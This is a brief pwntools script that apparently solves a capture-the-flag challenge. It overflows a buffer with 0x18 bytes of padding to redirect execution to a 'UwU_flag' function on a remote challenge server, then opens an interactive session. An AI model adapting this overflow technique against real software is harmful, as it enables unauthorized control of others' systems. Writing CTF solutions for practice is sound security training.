from pwn import *
from LibcSearcher import *

binary = './chal'
elf = ELF(binary)

context(arch = elf.arch, log_level = 'debug', os = 'linux', terminal = ['tmux', 'splitw', '-hp', '62'])

# r = process(binary)
r = remote('chall.icohk-test.one', 35001)

r.recvuntil(b'Try to get the flag by writing something in the buffer for me UwU\n')
payload = flat(
    b'A' * 0x18,
    elf.sym['UwU_flag']
)
r.sendline(payload)

r.interactive()